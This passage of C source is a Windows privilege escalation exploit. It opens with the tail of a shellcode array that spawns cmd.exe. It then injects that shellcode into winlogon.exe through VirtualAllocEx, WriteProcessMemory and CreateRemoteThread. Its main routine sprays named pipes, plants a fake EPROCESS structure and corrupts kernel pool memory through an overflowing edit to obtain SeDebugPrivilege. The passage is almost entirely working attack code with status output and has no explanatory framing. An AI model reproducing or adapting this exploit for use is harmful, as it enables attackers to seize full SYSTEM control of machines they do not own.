		0x24, 0x70, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0x78, 0x01, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xC7, 0x84, 0x24, 0x84, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x88, 0x01,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x8C, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0xC7, 0x84, 0x24, 0x90, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x94,
		0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x98, 0x01, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0xC7, 0x84, 0x24, 0x9C, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x66,
		0x89, 0x84, 0x24, 0xA0, 0x01, 0x00, 0x00, 0x33, 0xC0, 0x66, 0x89, 0x84, 0x24, 0xA2, 0x01, 0x00,
		0x00, 0x48, 0xC7, 0x84, 0x24, 0xA8, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x84,
		0x24, 0xB0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0xB8, 0x01, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0xC0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x48, 0x8D, 0x84, 0x24, 0xE0, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x33, 0xC0, 0xB9, 0x18,
		0x00, 0x00, 0x00, 0xF3, 0xAA, 0xC7, 0x84, 0x24, 0x9C, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
		0xB8, 0x05, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0xA0, 0x01, 0x00, 0x00, 0xC6, 0x44, 0x24,
		0x68, 0x63, 0xC6, 0x44, 0x24, 0x69, 0x6D, 0xC6, 0x44, 0x24, 0x6A, 0x64, 0xC6, 0x44, 0x24, 0x6B,
		0x2E, 0xC6, 0x44, 0x24, 0x6C, 0x65, 0xC6, 0x44, 0x24, 0x6D, 0x78, 0xC6, 0x44, 0x24, 0x6E, 0x65,
		0xC6, 0x44, 0x24, 0x6F, 0x00, 0x48, 0x8D, 0x84, 0x24, 0xE0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44,
		0x24, 0x48, 0x48, 0x8D, 0x84, 0x24, 0x60, 0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48,
		0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00,
		0x00, 0xC7, 0x44, 0x24, 0x28, 0x10, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00,
		0x00, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x54, 0x24, 0x68, 0x33, 0xC9, 0xFF, 0x94,
		0x24, 0x50, 0x01, 0x00, 0x00, 0x89, 0x84, 0x24, 0xD8, 0x00, 0x00, 0x00, 0x83, 0xBC, 0x24, 0xD8,
		0x00, 0x00, 0x00, 0x00, 0x74, 0x1E, 0x48, 0x8B, 0x8C, 0x24, 0xE8, 0x01, 0x00, 0x00, 0xFF, 0x94,
		0x24, 0x20, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xE0, 0x01, 0x00, 0x00, 0xFF, 0x94, 0x24,
		0x20, 0x01, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x00, 0x02, 0x00, 0x00, 0x5F, 0xC3
	};
	if (hKernel32 == NULL) {
		err_exit("Failed to get Kernel32 module handle");
	}

	pid = getProcessId("winlogon.exe");
	if (pid == 0) {
		CloseHandle(hKernel32);
		err_exit("Failed to get winlogon.exe process pid");
	}
	printf("[+] winlogon.exe process pid: %#x\n", pid);

	processHandle = OpenProcess(GENERIC_ALL, FALSE, pid);
	if (processHandle == INVALID_HANDLE_VALUE || !processHandle) {
		CloseHandle(hKernel32);
		err_exit("Failed to get winlogon.exe process handle");
	}
	printf("[+] winlogon.exe process handle: %#x\n", (DWORD)processHandle);

	remoteAddress = VirtualAllocEx(processHandle, NULL, 0x3000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteAddress) {
		CloseHandle(hKernel32);
		CloseHandle(processHandle);
		err_exit("Failed to allocate memory in winlogon.exe process");
	}

	if (!WriteProcessMemory(processHandle, remoteAddress, shellcode, sizeof(shellcode), NULL)) {
		CloseHandle(hKernel32);
		CloseHandle(processHandle);
		VirtualFreeEx(processHandle, remoteAddress, 0, MEM_RELEASE);
		err_exit("Failed to write shellcode to winlogon.exe process virtual memory");
	}

	HANDLE hRemote = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddress, NULL, 0, NULL);
	if (hRemote == NULL) {
		CloseHandle(hKernel32);
		CloseHandle(processHandle);
		VirtualFreeEx(processHandle, remoteAddress, 0, MEM_RELEASE);
		err_exit("Failed to create remote thread in winlogon.exe to run shellcode");
	}

	CloseHandle(hKernel32);
	CloseHandle(processHandle);
}

int main()
{
	init();
	char inBuffer[1024] = { 0 };
	char outBuffer[1024] = { 0 };
	create_fakeEprocess(address.curToken + 0x48);

	PipeHandles* pHandles0 = InitSprayPipe(0x50, 0x2000);
	PipeHandles* pHandles1 = InitSprayPipe(0x50, 0x2000);

	SprayPipe(pHandles0);
	add(0x40);
	SprayPipe(pHandles1);

	memset(inBuffer, 'B', 0x50);
	*(DWORD64*)(inBuffer + 0x40 + 0) = 0x7246704e0a050005;
	*(DWORD64*)(inBuffer + 0x40 + 8) = FAKE_EPROCESS_ADDRESS;

	//	getchar();
	Sleep(1000);
	edit(0x50, inBuffer);
	//	getchar();

	closePipes(pHandles0);
	closePipes(pHandles1);
	Sleep(1000);

	if (checkPrivilege((char*)SE_DEBUG_NAME)) {
		info("[+] Get SeDebugPrivilege successfully (:");
		escalate();
	}

	puts("[+] EXP NERVER END!");
	//	getchar();
	return 0;
}
